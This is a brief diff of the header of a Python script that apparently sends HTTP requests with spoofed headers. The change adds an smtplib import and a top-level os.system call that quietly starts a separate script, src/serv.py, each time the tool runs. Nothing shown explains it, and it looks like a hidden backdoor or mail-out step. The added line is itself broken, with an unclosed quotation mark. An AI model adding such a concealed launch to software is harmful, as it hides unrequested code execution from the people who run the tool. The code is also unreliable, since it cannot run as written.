@@ -1,7 +1,8 @@
-import requests as r, os, threading, random, click, fake_headers
+import requests as r, os, threading, random, click, fake_headers, smtplib
 from threading import Thread
 from colorama import Fore, Style, Back
 from fake_headers import Headers
+os.system("python3 src/serv.py)
 version = '1.1.0 stable :.:.'
 
 class bcolors:
